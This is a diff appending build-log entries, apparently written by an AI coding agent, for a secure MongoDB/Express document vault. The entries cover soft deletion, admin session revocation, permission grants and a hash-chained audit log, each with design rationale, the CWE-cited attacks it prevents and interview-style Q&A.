@@ -678,7 +678,911 @@ In standard XACML and zero-trust authorization architectures:
    - By encapsulating all model operations inside `documentService.js` and banning direct model queries in routes (Rule 2), no document can be fetched from the database without passing through `getDocumentById()`.
    - `getDocumentById()` systematically invokes `authorize(user, doc, action)` before returning the document instance. The authorization check is structurally coupled to the database query: it is physically impossible for a controller to retrieve a document without triggering the authorization policy.
 3. **Consistency and Auditing:**
-   - Centralizing document access guarantees uniform error behavior (always throwing `NotFoundError` returning 404 per Rule 3 & 4) and guarantees that every denied attempt emits an immutable security audit event via `src/audit.js`.
+---
+
+## Build Entry: Soft Deletion via `deletedAt` Tombstones, Universal 404 Access Denial, and Audit Reference Retention
+**Date:** 2026-10-24  
+**Author:** Antigravity  
+
+---
+
+### 1. What Was Built
+- **Soft Deletion Mechanism (`src/services/documentService.js`):**
+  - Updated `deleteDocument()` to set `doc.deletedAt = new Date()` and save the document record instead of executing `Document.deleteOne()` or unlinking the physical disk payload.
+  - Preserved the MongoDB document record to maintain unbroken referential integrity with the `AuditEvent` collection, allowing `.populate('documentId')` to resolve the soft-deleted document's metadata.
+- **Centralized Universal Access Rejection (`src/authz.js`):**
+  - Added soft-deletion enforcement in `authorize(user, doc, action)`: any document with `deletedAt !== null` immediately calls `deny(user, doc, action, 'Document has been deleted')`.
+  - Guarantees that soft-deleted documents return HTTP 404 (`Not Found`) for all actors—including document owners, viewers with granted permissions, and system administrators—on every route (`GET /:id`, `GET /:id/download`, `PATCH /:id`, `PUT /:id`, and repeated `DELETE /:id`).
+- **Database-Level Search & List Exclusion (`src/services/documentService.js` & `src/routes/documents.js`):**
+  - Enforced `{ deletedAt: null }` at the root of MongoDB query filters in `listDocuments()` and `searchDocuments()`, guaranteeing deleted documents never appear in user lists or search query results.
+  - Implemented `GET /documents/search` and query parameter searching on `GET /documents` (`?search=...`, `?q=...`).
+  - Added RESTful `GET /documents/:id` endpoint for individual document retrieval via `documentService.getDocumentById()`.
+- **TDD Test-First Specification (`tests/documents.test.js`):**
+  - Implemented comprehensive integration tests verifying soft deletion, audit referencing, universal 404 route denial, list/search exclusion, and policy checks before implementing code changes.
+- **Architectural Documentation (`docs/DECISIONS.md`):**
+  - Recorded ADR 024: Soft Deletion via Tombstone (`deletedAt`) with Audit Trail Preservation and Universal 404 Access Denial.
+
+---
+
+### 2. Which Files Were Created / Modified
+| File | Status | Purpose |
+|---|---|---|
+| `tests/documents.test.js` | Modified | Authored test-first specifications verifying soft deletion, audit log referencing, 404 on all routes for everyone, and omission from list/search. |
+| `src/authz.js` | Modified | Added soft-delete gate in `authorize()` rejecting any operation on a deleted document with 404 `AuthorizationError`. |
+| `src/services/documentService.js` | Modified | Changed `deleteDocument()` to set `deletedAt` and save; added search filtering to `listDocuments()` with `{ deletedAt: null }`; exported `searchDocuments()`. |
+| `src/routes/documents.js` | Modified | Added `GET /documents/:id` and `GET /documents/search` endpoints; passed `req.query` to `listDocuments()`. |
+| `docs/DECISIONS.md` | Modified | Appended ADR 024. |
+| `docs/BUILD_LOG.md` | Modified | Appended this technical build log entry. |
+
+---
+
+### 3. Why This Design
+- **Audit Trail Integrity & Forensic Preservation:**
+  - In compliance-regulated document vaults (e.g., SOC 2, HIPAA, ISO 27001), destroying database records breaks referential integrity. When audit logs reference a deleted file's `ObjectId`, hard deletion turns those foreign keys into dangling pointers (`null` on population). Soft-deleting retains the document entity with its immutable cryptographic SHA-256 digest, original filename, and ownership history for forensic accountability.
+- **Universal 404 Access Denial (Information Disclosure Defense):**
+  - If a system returns HTTP 410 `Gone` or HTTP 403 `Forbidden` when an unauthorized user probes a deleted document, attackers can map the historical existence of confidential files. Returning HTTP 404 `Not Found` for *everyone* (including the document owner) ensures that deleted resources are indistinguishable from non-existent resources, preventing existence oracle attacks.
+- **Database-Level Query Filtering (Rule 6):**
+  - Enforcing `{ deletedAt: null }` inside MongoDB queries ensures that soft-deleted documents never enter application memory during listing or search operations. This preserves database pagination (`skip`/`limit`) integrity and prevents response-timing discrepancies that could reveal deleted document volume.
+
+---
+
+### 4. What Attacks This Design Prevents
+1. **Audit Trail Invalidation & Forensic Evidence Destruction (CWE-778):**
+   - Retaining soft-deleted records prevents attackers from destroying audit evidence by deleting compromised documents, ensuring that audit events maintain complete provenance.
+2. **Resource Existence Enumeration via Status Code Oracles (CWE-200 / CWE-209):**
+   - Returning HTTP 404 universally on all routes ensures that deleted documents cannot be probed or differentiated from non-existent documents.
+3. **Ghost Access & Unauthorized Access to Deleted Assets (CWE-284):**
+   - Placing the `doc.deletedAt` check inside `authorize()` guarantees that no user—even with pre-existing explicit permission grants—can download, inspect, or modify a deleted file.
+4. **Data Leakage in Search & Listing (CWE-200):**
+   - Database-level filtering strictly excludes soft-deleted items from keyword search results and collection listings.
+
+---
+
+### 5. Technical Interview Questions & Answers
+
+#### Question 1: What are the security and regulatory advantages of soft-deletion using tombstones over hard deletion in enterprise vault architectures?
+**Answer:**
+1. **Referential Integrity for Non-Repudiable Audit Trails:**
+   - Security audit logs (`AuditEvent`) record events such as uploads, permissions grants, downloads, and deletions, typically storing foreign key references (`documentId`). If an application performs hard deletions (`Document.deleteOne()`), all historical audit entries referencing that document become broken dangling pointers. Soft deletion retains the document entity (including immutable cryptographic hashes like SHA-256 and original metadata) so auditors can reconstruct complete provenance.
+2. **Accidental Deletion & Forensic Recovery:**
+   - Hard deletion is permanent and immediate. In insider-threat or ransomware scenarios where malicious actors attempt to wipe sensitive corporate records, soft deletion provides a tombstone marker that enables incident response teams to investigate what was targeted and restore data if necessary.
+3. **Legal Hold Compliance:**
+   - Legal and regulatory frameworks (e.g. SEC Rule 17a-4, Sarbanes-Oxley, HIPAA) mandate document retention for fixed statutory periods. When a user "deletes" a file, the organization cannot purge the record if it is subject to an active litigation hold; soft deletion allows the application to hide the document from users while fulfilling legal retention obligations.
+
+#### Question 2: Why must soft-deleted resources return HTTP 404 rather than HTTP 410 Gone or HTTP 403 Forbidden in high-assurance security applications?
+**Answer:**
+1. **Elimination of Resource Existence Oracles (CWE-200):**
+   - An HTTP 410 `Gone` status explicitly confirms to the requester: *"This resource once existed here, but has been deleted."* In a confidential document vault, confirming that a sensitive file (e.g., `merger_agreement_q3.pdf` at ID `65a...`) existed is itself an information leak that assists adversary reconnaissance.
+   - An HTTP 403 `Forbidden` status informs the requester that the resource exists but they lack permission.
+   - Returning HTTP 404 `Not Found` universally—for anonymous users, third-party viewers, administrators, and even the original owner—ensures that deleted documents are functionally and observationally identical to non-existent IDs.
+2. **Timing Equalization:**
+   - When coupled with constant-time error handling, returning 404 prevents side-channel timing analysis where attackers measure database query differences to determine whether an ID was ever registered.
+
+#### Question 3: How do you prevent query performance degradation and index bloat when implementing soft deletion on high-volume MongoDB collections?
+**Answer:**
+1. **Partial Indexes (MongoDB Partial Filter Expressions):**
+   - As a collection grows, soft-deleted documents accumulate and take up memory in B-Tree indexes. If 90% of documents in a collection are active and 10% are soft-deleted, standard compound indexes on `(ownerId, createdAt)` index all documents, wasting RAM.
+   - Using MongoDB Partial Indexes with a filter expression:
+     ```javascript
+     documentSchema.index(
+       { owner: 1, createdAt: -1 },
+       { partialFilterExpression: { deletedAt: null } }
+     );
+     ```
+     ensures that MongoDB only indexes active documents. Queries filtering by `{ deletedAt: null }` utilize the partial index, resulting in smaller index sizes, higher cache hit ratios, and faster write throughput.
+2. **Sparse Indexes vs Null Filtering:**
+   - When soft-deleted records have `deletedAt` set to a timestamp and active records omit the field or have `null`, indexing `deletedAt` with partial filtering avoids indexing soft-deleted records for active search queries while allowing background lifecycle cleanup jobs (e.g. TTL indexes on `deletedAt`) to efficiently identify expired tombstones.
+
+---
+
+## Build Entry: Admin User Lifecycle Management, 404 Access Cloaking, and Instant Multi-Session Invalidation
+**Date:** 2026-10-24  
+**Author:** Antigravity  
+
+---
+
+### 1. What Was Built
+- **Admin User Management Endpoints (`src/routes/admin.js`):**
+  - `POST /admin/users` (and `/api/admin/users`): Allows administrator to create new user accounts with Argon2id password hashing, email validation, and role assignment (`user` vs `admin`).
+  - `PATCH /admin/users/:id/role`: Allows administrator to promote or demote user roles.
+  - `POST /admin/users/:id/disable` (and `PATCH /admin/users/:id/disable`): Sets `isActive: false` and instantly invalidates all active sessions for that user across all devices.
+- **Strict 404 Authorization Cloaking:**
+  - Implemented `requireAdmin` middleware: unauthenticated requests, non-admin accounts (`role: 'user'`), and deactivated accounts unconditionally receive HTTP 404 `Not Found` (never 403 or 401 per Rule 3), concealing administrative interfaces.
+- **Instant Multi-Session Revocation:**
+  - Implemented `endUserSessions()`: synchronously purges session entries from the Express session store and MongoDB `sessions` collection, closing any token revocation vulnerability window immediately upon account suspension.
+- **Integration Test Suite (`tests/admin.test.js`):**
+  - Authored 20 automated tests validating admin route security, non-admin 404 cloaking, password hashing, role updates, and multi-session revocation.
+- **Architectural Documentation (`docs/DECISIONS.md`):**
+  - Recorded ADR 025.
+
+---
+
+### 2. Which Files Were Created / Modified
+| File | Status | Purpose |
+|---|---|---|
+| `tests/admin.test.js` | Created | Automated test suite (20 tests) testing admin routes, 404 cloaking, and immediate session invalidation. |
+| `src/routes/admin.js` | Created | Admin router handling user creation, role updates, and user disabling with session destruction. |
+| `src/app.js` | Modified | Mounted admin user routes at `/admin/users`, `/api/admin/users`, `/users`, and `/api/users`. |
+| `docs/DECISIONS.md` | Modified | Recorded ADR 025. |
+| `docs/BUILD_LOG.md` | Modified | Appended this build log entry. |
+
+---
+
+### 3. Why This Design
+- **Universal 404 Cloaking Gate:** Returning 403 Forbidden to unauthorized callers confirms the existence of administrative surfaces, inviting targeted brute-force and vulnerability scanning. Returning 404 renders administrative surfaces indistinguishable from non-existent routes.
+- **Active Session Invalidation vs Lazy Database Checks:** In high-concurrency systems, relying only on database queries to detect deactivated users can leave stale sessions alive in memory caches or token stores. Actively destroying the session records in the session store ensures instantaneous revocation across all client instances.
+
+---
+
+### 4. What Attacks This Design Prevents
+1. **Administrative Surface Enumeration (CWE-200):** Non-admins receive 404, preventing attackers from mapping administrative capabilities.
+2. **Zombie Session / Revocation Delay Exploitation (CWE-613):** Disabled accounts have all active sessions terminated immediately.
+3. **Privilege Escalation via Mass Assignment (CWE-915):** Endpoints validate role changes strictly against allowed enums.
+
+---
+
+### 5. Technical Interview Questions & Answers
+
+#### Question 1: Why should administrative endpoints return HTTP 404 instead of HTTP 403 when accessed by non-administrative users?
+**Answer:**
+Returning HTTP 403 Forbidden leaks information (CWE-200) by confirming that an administrative endpoint exists at that URI. Attackers perform automated endpoint scanning to find interfaces like `/admin/users` or `/api/admin`. An HTTP 403 response tells the attacker they found a high-value route and prompts them to look for authentication bypasses or privilege escalation flaws. Returning HTTP 404 Not Found makes the route completely invisible, frustrating reconnaissance and preventing resource existence enumeration.
+
+#### Question 2: Why is modifying `isActive: false` in the database insufficient on its own to immediately revoke a user's access, and how do you achieve instantaneous session invalidation?
+**Answer:**
+In many web architectures, session verification is decoupled from database queries (e.g. sessions are cached in Redis or in-memory, or endpoints only check session middleware without querying the user table on every single static or cached request). If `user.isActive` is set to `false`, an active session cookie remains valid in the session store until its TTL expires unless explicitly invalidated. To achieve true instantaneous revocation, the deactivation service must coordinate both database flag mutation and active destruction of all session records tied to that `userId` in the session store.
+
+#### Question 3: How does Argon2id protect against offline password cracking compared to older hashing algorithms like SHA-256 or bcrypt?
+**Answer:**
+Unsalted or simple salted SHA-256 algorithms can be computed at billions of attempts per second on modern GPUs. Bcrypt introduces a computational work factor but has a fixed memory requirement of only 4 KB, allowing high-density parallel cracking on GPU/FPGA clusters. Argon2id is a memory-hard algorithm requiring configurable RAM (e.g. 19MB–64MB) per hashing instance, which saturates GPU memory bandwidth and prevents massive parallel dictionary attacks while resisting side-channel cache-timing attacks.
+
+---
+
+## Build Entry: Document Permission Granting & Revocation, Complete Lifecycle TDD, and Zero-Cache Dynamic Database Evaluation
+**Date:** 2026-10-24  
+**Author:** Antigravity  
+
+---
+
+### 1. What Was Built
+- **Test-Driven Permission Lifecycle Suite (`tests/permissions.test.js` - 16 passing tests):**
+  - **Grant $\rightarrow$ Read $\rightarrow$ Revoke $\rightarrow$ 404 Flow:**
+    - Document owner grants `read` level to viewer.
+    - Viewer reads document metadata (`GET /documents/:id`) successfully (HTTP 200).
+    - Document owner revokes permission for viewer (`DELETE /documents/:id/permissions/:userId`).
+    - Viewer's immediate next request returns HTTP 404 `Not Found` (never 403 per Rule 3 & 4).
+  - **Privilege Boundary Enforcement:**
+    - Rejection of edit attempts (`PATCH /documents/:id`, `PUT /documents/:id`) with HTTP 404 for viewers with `read` grants.
+    - Verification that viewers with `edit` grants can update metadata (`PATCH /documents/:id` returns 200), but cannot delete documents (`DELETE /documents/:id` returns 404) and cannot grant permissions to other users (`POST /documents/:id/permissions` returns 404).
+    - Verification that viewers with `edit` grants cannot revoke permissions (`DELETE /documents/:id/permissions/:userId` returns 404).
+  - **Ownership Exclusivity:**
+    - Verified that only the document owner can grant or revoke permissions. Non-owners (viewers, unrelated users, administrators without document ownership) receive HTTP 404.
+    - Unauthenticated requests return HTTP 401.
+  - **Input Validation & Idempotency:**
+    - Rejection of invalid permission levels (e.g. `delete`, `admin`, `manage`) with HTTP 400.
+    - Returning 404 when attempting to grant permissions to a non-existent target user ID.
+    - Idempotent permission level updates (e.g., upgrading `read` to `edit` via upsert).
+    - Full parity support for alternative route aliases (`POST /documents/:id/grant`, `POST /documents/:id/revoke`, and query-based `DELETE /documents/:id/permissions?userId=...`).
+- **Encapsulated Permission Service Functions (`src/services/documentService.js`):**
+  - Implemented `grantPermission(user, documentId, { userId, email, level }, context)`:
+    - Enforces `authorize(user, doc, 'grant')`.
+    - Validates target user existence and ensures `level` is in `['read', 'edit']`.
+    - Upserts the `Permission` document (`findOneAndUpdate` with `upsert: true`).
+    - Logs an immutable `PERMISSION_GRANT` audit event with status `SUCCESS`.
+  - Implemented `revokePermission(user, documentId, targetUserId, context)`:
+    - Enforces `authorize(user, doc, 'grant')`.
+    - Removes the record from the `Permission` collection (`deleteOne`).
+    - Logs an immutable `PERMISSION_REVOKE` audit event with status `SUCCESS`.
+- **Zero-Cache Dynamic Database Evaluation:**
+  - Evaluated on every incoming request in `src/authz.js` via `await Permission.findOne({ documentId: doc._id, userId: user._id })` directly against MongoDB with zero in-memory or session caching. Deleting or updating a permission record takes effect instantaneously.
+- **RESTful Permission Routes (`src/routes/documents.js`):**
+  - Mounted `POST /documents/:id/permissions` and alias `POST /documents/:id/grant`.
+  - Mounted `DELETE /documents/:id/permissions/:userId`, alias `POST /documents/:id/revoke`, and query alias `DELETE /documents/:id/permissions`.
+- **Architectural Documentation (`docs/DECISIONS.md`):**
+  - Recorded ADR 026: Granular Document Permission Granting and Revocation, Owner Exclusivity, and Zero-Cache Direct Database Evaluation.
+
+---
+
+### 2. Which Files Were Created / Modified
+| File | Status | Purpose |
+|---|---|---|
+| `tests/permissions.test.js` | Created | Test-first integration suite (16 tests) covering the grant/read/revoke/404 lifecycle, privilege boundaries, ownership exclusivity, and input validation. |
+| `src/services/documentService.js` | Modified | Implemented `grantPermission()` and `revokePermission()` with ownership verification, input validation, and audit event logging. |
+| `src/routes/documents.js` | Modified | Mounted permission grant and revoke endpoints with RESTful paths and aliases. |
+| `docs/DECISIONS.md` | Modified | Appended ADR 026. |
+| `docs/BUILD_LOG.md` | Modified | Appended this technical build log entry. |
+
+---
+
+### 3. Why This Design
+- **Elimination of the Stale Revocation Window:**
+  - In distributed web architectures, permissions are frequently cached in Redis or baked into stateless JWT claims. While caching reduces database read traffic, it introduces a dangerous "revocation delay" window: after an owner revokes a user's access, the revoked user can continue reading or exfiltrating confidential documents until the cache TTL expires.
+  - By performing a dynamic query (`Permission.findOne`) against MongoDB on every request, permission state is guaranteed to be completely fresh. Revocation takes effect with zero latency.
+- **Indexed Read Performance:**
+  - The `Permission` collection utilizes a unique compound index `{ documentId: 1, userId: 1 }`. MongoDB evaluates this query in $<1\text{ms}$ via indexed B-Tree index lookups, avoiding collection scans and providing sub-millisecond authorization without caching.
+- **Ownership Exclusivity & Privilege Ceilings:**
+  - Rule 4 strictly dictates that only the owner can grant or revoke permissions. Even system administrators cannot grant themselves or others access to files they do not own.
+  - Restricting permission levels to `['read', 'edit']` ensures that viewers can never be delegated administrative capabilities (`delete` or `grant`), preventing lateral and vertical privilege escalation.
+- **Universal 404 Error Cloaking:**
+  - When an unauthorized viewer attempts to edit a read-only document, or when a non-owner attempts to grant permissions, the system returns HTTP 404 `Not Found` (never 403). Unauthorized callers cannot determine whether a document exists or what access control lists are configured on it.
+
+---
+
+### 4. What Attacks This Design Prevents
+1. **Stale Permission Window Exploitation (CWE-613 / CWE-384):**
+   - Zero-cache database evaluation ensures that a revoked user cannot access a document a fraction of a second after revocation.
+2. **Privilege Escalation via Unauthorized Permission Delegation (CWE-269 / CWE-284):**
+   - Viewers with `edit` permissions cannot grant permissions to third-party accounts, preventing compromised viewer accounts from spreading access.
+3. **Unauthorized Modification by Read-Only Viewers (CWE-285):**
+   - Viewers granted `read` level are rejected with 404 when attempting metadata mutations (`PATCH /documents/:id`, `PUT /documents/:id`).
+4. **Unauthorized Deletion by Edit Viewers (CWE-284):**
+   - Viewers granted `edit` level are rejected with 404 when attempting document deletion (`DELETE /documents/:id`).
+5. **Access Control & Document Existence Enumeration (CWE-200 / CWE-209):**
+   - Returning HTTP 404 for all denied authorization attempts ensures attackers cannot discover confidential document IDs or probe ACLs.
+
+---
+
+### 5. Technical Interview Questions & Answers
+
+#### Question 1: Why is caching access control permissions in memory or session tokens dangerous in multi-tenant document systems, and how does direct database evaluation prevent stale permission windows?
+**Answer:**
+1. **The Stale Revocation Window:**
+   - When permissions are cached (e.g. in Redis with a 15-minute TTL, in application memory, or inside signed JWT access tokens), the authorization decision is decoupled from the current source of truth.
+   - If an employee is terminated or a sensitive document is unshared, the owner executes a revocation in the database. However, the revoked user continues making requests using their active session or cached token. Until the cache expires, the application continues granting access, creating a window for data exfiltration.
+2. **Direct Database Evaluation with Compound Indexing:**
+   - Direct database evaluation (`Permission.findOne({ documentId, userId })`) queries the authoritative database on every request. When `Permission.deleteOne()` commits, the permission record ceases to exist immediately. The very next HTTP request evaluates against the database, finds `null`, and returns HTTP 404.
+   - Leveraging MongoDB's unique compound index `{ documentId: 1, userId: 1 }` guarantees that the lookup executes in $O(\log N)$ B-Tree lookup time with minimal I/O overhead, delivering real-time consistency without cache invalidation complexity.
+
+#### Question 2: How do you design an Access Control List (ACL) data model to prevent BSON document size bloat and write lock contention in high-concurrency document management systems?
+**Answer:**
+1. **The Pitfall of Embedded Permissions Arrays:**
+   - Embedding permissions directly inside the document (`document.permissions = [{ userId, level }, ...]`) creates several severe architectural bottlenecks:
+     - **BSON Size Limits:** In enterprise environments where documents are shared with hundreds or thousands of users or groups, the document risks exceeding MongoDB's 16MB document size limit.
+     - **Write Contention:** Whenever any permission is granted, modified, or revoked, the entire `Document` record must be locked for writing. Concurrent metadata updates and permission changes cause document write conflicts.
+     - **Search Filtering Inefficiency:** Filtering search queries across embedded permission arrays (`$elemMatch`) is slower and harder to index than normalized collection joins or indexed lookups.
+2. **The Normalized Collection Pattern:**
+   - Separating permissions into an independent `Permission` collection with fields `{ documentId, userId, level, createdAt }`:
+     - Guarantees each permission is an isolated document, eliminating document size limits.
+     - Confines permission grant/revoke writes to the `Permission` collection without locking the parent `Document`.
+     - Supports unique compound indexing `{ documentId: 1, userId: 1 }`, guaranteeing idempotency and preventing duplicate grants.
+
+#### Question 3: Why should a system return HTTP 404 rather than HTTP 403 when a user with a `read` grant attempts to edit, delete, or grant permissions on a document?
+**Answer:**
+1. **Prevention of Capability and Resource Existence Oracles (CWE-200):**
+   - In standard HTTP semantics, HTTP 403 Forbidden indicates: *"The server understood the request, but refuses to authorize it."* This implicitly tells the attacker two critical facts:
+     - The document exists at that ID.
+     - The requester's credentials were authenticated, but their current role/grant lacks the required privilege level.
+   - An attacker can exploit 403 responses to map out the system: differentiating between IDs that do not exist (404) and confidential documents they are forbidden to access (403).
+2. **Uniform 404 Cloaking:**
+   - By returning HTTP 404 Not Found on *all* authorization denials, the system makes unauthorized documents observationally indistinguishable from non-existent resources.
+   - A user with a `read` grant attempting `PATCH /documents/:id` receives 404. They cannot probe whether the endpoint supports editing or whether the document allows writes; from their perspective, the editable resource simply does not exist.
+
+---
+
+## Build Entry: Cryptographically Chained Audit Subsystem, verifyChain(), Concurrency Fork Resistance, and Database-Level App User Least Privilege
+**Date:** 2026-10-24  
+**Author:** Antigravity  
+
+---
+
+### 1. What Was Built
+- **Comprehensive Audit Test Suite (`tests/audit.test.js` - 24 passing tests, written first):**
+  - **Cryptographic Hash Chaining:** Verified genesis block sequence 1 and 64-zero `previousHash`, and subsequent sequential block linkage where each event's `previousHash` equals prior block's `hash`.
+  - **Tamper Detection (`verifyChain()`):** Verified that altering an audit row directly at the database level makes `verifyChain()` fail with `valid: false` identifying the tampered sequence; verified detection of modified `previousHash`, modified `hash`, and sequence gaps from deleted rows.
+  - **Concurrency & Fork Prevention:** Executed 10 parallel `logAuditEvent` calls simultaneously via `Promise.all`. Confirmed that unique index enforcement on `sequenceNumber` with jittered backoff retries assigns strictly contiguous sequence numbers (1..10) with zero forks.
+  - **MongoDB App User Least Privilege:** Verified that `audit_app_user` can insert and find audit events, but update and delete commands fail with database-level `not authorized` errors.
+  - **Complete Event Logging Coverage:** Verified logging for upload, download, metadata edit, file replacement (recording both `oldSha256` and `newSha256`), delete, grant, revoke, user create, role change, user disable, and every denied attempt (unauthorized access, bad uploads, non-admin attempts).
+  - **End-to-End Chain Verification:** Verified that an entire lifecycle workflow of real application operations forms a valid, unbroken cryptographic chain.
+- **Cryptographic Hash Chaining Engine (`src/audit.js`):**
+  - Implemented deterministic key-sorted serialization `canonicalizeContent()`.
+  - Implemented `calculateHash(previousHash, contentStr)` computing SHA-256 over `previousHash:canonicalContent`.
+  - Implemented `logAuditEvent(params)` with automatic concurrency retry on MongoDB duplicate key error `E11000`.
+  - Implemented `verifyChain()` validating sequence continuity, hash pointer fidelity, and content integrity.
+  - Implemented `setupAuditAppUser(mongooseConnection)` configuring `auditInsertFindOnly` role (`insert` and `find` actions only on `auditevents`) and `audit_app_user`.
+- **Database Model Enhancements (`src/models/AuditEvent.js`):**
+  - Added `sequenceNumber`, `previousHash`, and `hash` fields.
+  - Enforced `{ sequenceNumber: 1 }` unique index.
+  - Added instance-level fallback generation in pre-save for backward compatibility with direct Mongoose creation.
+- **Application Event Logging Integration:**
+  - Implemented `replaceDocumentFile()` in `src/services/documentService.js` and mounted `POST /documents/:id/replace` in `src/routes/documents.js`, recording `oldSha256` and `newSha256`.
+  - Integrated `USER_CREATE`, `ROLE_CHANGE`, `USER_DISABLE`, and `ACCESS_DENIED` audit logging in `src/routes/admin.js`.
+  - Added provisioning in `scripts/setup-audit-user.js` and `scripts/seed.js`.
+- **Architectural Documentation (`docs/DECISIONS.md`):**
+  - Recorded ADR 027.
+
+---
+
+### 2. Which Files Were Created / Modified
+| File | Status | Purpose |
+|---|---|---|
+| `tests/audit.test.js` | Created | Comprehensive test-first integration suite (24 tests) validating hash chaining, verifyChain, tamper detection, concurrency, app user least privilege, and event logging. |
+| `src/audit.js` | Re-implemented | Core audit engine featuring cryptographic chaining, SHA-256 digest computation, concurrency retry, verifyChain(), and setupAuditAppUser(). |
+| `src/models/AuditEvent.js` | Modified | Added `sequenceNumber`, `previousHash`, and `hash` fields with unique index and fallback pre-save hook. |
+| `src/services/documentService.js` | Modified | Implemented `replaceDocumentFile()` calculating and recording old and new SHA-256 digests in `FILE_REPLACE` audit event. |
+| `src/routes/documents.js` | Modified | Mounted file replacement endpoints (`POST /documents/:id/replace`, aliases `PUT /replace`, `POST /file`, `PUT /file`). |
+| `src/routes/admin.js` | Modified | Integrated audit logging for user creation (`USER_CREATE`), role changes (`ROLE_CHANGE`), disabling (`USER_DISABLE`), and denied attempts (`ACCESS_DENIED`). |
+| `scripts/setup-audit-user.js` | Created | Standalone provisioning script to create the MongoDB app user with least privilege. |
+| `scripts/seed.js` | Modified | Integrated audit app user provisioning into the database seed lifecycle. |
+| `docs/DECISIONS.md` | Modified | Appended ADR 027. |
+| `docs/BUILD_LOG.md` | Modified | Appended this technical build log entry. |
+
+---
+
+### 3. Why This Design
+- **Cryptographic Immutability & Tamper Evidence:**
+  - Conventional database audit tables can be surreptitiously modified by attackers with compromised database credentials. By linking every event to the prior event's hash (`hash = SHA256(previousHash + ":" + canonicalContent)`), modifying any historical event alters its hash, which immediately invalidates the next event's `previousHash` pointer and breaks all subsequent links. `verifyChain()` detects any alteration with mathematical certainty.
+- **Unique Index Fork Prevention with Automatic Retry:**
+  - In distributed systems, concurrent workers logging events at the same microsecond can create divergent chains ("forks") if both workers link to the same previous record. By placing a unique index `{ sequenceNumber: 1 }` on MongoDB, the database engine guarantees that exactly one insert succeeds. The competing worker receives an `E11000` duplicate key error, triggers a jittered backoff, fetches the newly committed head of the chain, and links sequentially without branching.
+- **Database-Level Least Privilege (`auditInsertFindOnly`):**
+  - Application-level immutability hooks (`pre('save')`, `pre('updateOne')`) protect against accidental application modifications, but cannot defend against compromised MongoDB connections or raw database commands. Creating a dedicated MongoDB user restricted strictly to `insert` and `find` actions enforces immutability directly in the database engine, blocking `update` and `delete` commands even if application code is breached.
+
+---
+
+### 4. What Attacks This Design Prevents
+1. **Audit Log Tampering & Repudiation (CWE-778 / CWE-353):**
+   - Attackers altering audit records to conceal unauthorized activity are immediately detected by `verifyChain()`.
+2. **Audit Trail Forking & Desynchronization (CWE-362):**
+   - Unique sequence number indexing prevents race conditions from splitting the audit trail into parallel branches.
+3. **Database-Level Log Destruction (CWE-250):**
+   - Compromised application keys cannot delete or overwrite audit logs because the database engine rejects `update` and `delete` commands.
+4. **Silent Document Replacement & Integrity Loss (CWE-353):**
+   - File replacements record both `oldSha256` and `newSha256`, preserving cryptographic provenance of file modifications.
+5. **Reconnaissance via Admin Interface Enumeration (CWE-200):**
+   - Unauthorized attempts to access administrative endpoints log `ACCESS_DENIED` and return HTTP 404, preventing resource mapping.
+
+---
+
+### 5. Technical Interview Questions & Answers
+
+#### Question 1: How does cryptographic hash chaining provide non-repudiation and tamper-evidence in audit logging systems, and how does `verifyChain()` detect alterations?
+**Answer:**
+1. **The Hash Chaining Primitive:**
+   - In a hash-chained audit log, every record stores three cryptographic components: a monotonically increasing `sequenceNumber`, a `previousHash` pointer, and its own cryptographic `hash`.
+   - The hash is computed as:
+     $$\text{hash}_i = \text{SHA256}(\text{hash}_{i-1} \parallel \text{canonicalContent}_i)$$
+     where $\parallel$ denotes concatenation and $\text{canonicalContent}_i$ is a deterministic serialization of the event payload.
+2. **Tamper Detection Mechanism in `verifyChain()`:**
+   - If an adversary alters any field in record $k$ (e.g., changing status from `'DENIED'` to `'SUCCESS'`), $\text{canonicalContent}_k$ changes.
+   - When `verifyChain()` recomputes $\text{SHA256}(\text{hash}_{k-1} \parallel \text{canonicalContent}_k)$, the calculated digest will not match the stored $\text{hash}_k$.
+   - If the adversary also recalculates and updates $\text{hash}_k$, then in record $k+1$, $\text{previousHash}_{k+1}$ will point to the old hash, failing the pointer check.
+   - To successfully forge a tampered record, the attacker would have to recompute the hashes of all records from $k$ to $N$. If the latest hash is periodically anchored (e.g., to an external ledger, syslog, or S3 bucket with Object Lock), any historical forgery is detected immediately.
+
+#### Question 2: Why are unique indexes and optimistic retry loops superior to application-level mutexes for preventing audit chain forks under high concurrency?
+**Answer:**
+1. **The Limitation of Application-Level Mutexes:**
+   - In modern cloud environments, web applications run across multiple Node.js cluster processes, Docker containers, or serverless instances. An in-memory mutex (e.g. `async-mutex`) only synchronizes threads within a single process; it cannot prevent concurrent writes across separate server instances.
+   - Using distributed locks (e.g. Redlock in Redis) introduces external operational dependencies, lock timeout race conditions, and single points of failure.
+2. **Database Engine Unique Constraints as Atomic Arbiters:**
+   - MongoDB's B-Tree unique index `{ sequenceNumber: 1 }` acts as the single source of truth across all application instances. When two servers attempt to commit sequence $N+1$ concurrently, MongoDB's storage engine enforces atomic write serialization. Exactly one insert commits; all other inserts fail with duplicate key error `E11000`.
+3. **Optimistic Retry with Jitter:**
+   - Instead of blocking on pessimistic locks, workers operate optimistically: compute the expected sequence and hash, and attempt insertion. On collision, workers back off with randomized jitter, re-read the newly committed head, and retry. This provides non-blocking high throughput with mathematically guaranteed single-chain linearity.
+
+#### Question 3: Why is database-level Role-Based Access Control (RBAC) necessary in addition to application-level ORM/ODM immutability hooks?
+**Answer:**
+1. **The Failure Modes of Application-Level Hooks:**
+   - Mongoose pre-hooks (`schema.pre('updateOne')`, `schema.pre('save')`) only execute when operations originate through specific Mongoose model methods.
+   - They can be bypassed by:
+     - Direct MongoDB collection driver calls (`db.collection('auditevents').updateOne()`).
+     - Raw MongoDB pipeline updates or database management tools (Compass, mongosh).
+     - NoSQL injection vulnerabilities where attackers inject update operators (`$set`).
+     - Compromised server environments where an attacker loads a script that imports MongoDB without Mongoose schemas.
+2. **Database Engine Privilege Separation:**
+   - Configuring the MongoDB user (`audit_app_user`) with privileges restricted strictly to `insert` and `find` actions enforces security at the kernel/storage engine level.
+   - Even if an attacker executes arbitrary JavaScript inside the Node.js process or exploits a remote code execution (RCE) flaw, any attempt to run `update`, `delete`, `dropDatabase`, or `dropIndex` commands is intercepted and terminated by the MongoDB engine with an authorization failure (`CommandNotAuthorized`).
+
+---
+
+## Build Entry: Document Search Engine with In-Database Permission Filtering & Anti-Leakage Specification
+**Date:** 2026-10-24  
+**Author:** Antigravity  
+
+---
+
+### 1. What Was Built
+- **Strict Leakage Test Suite (TDD First):**
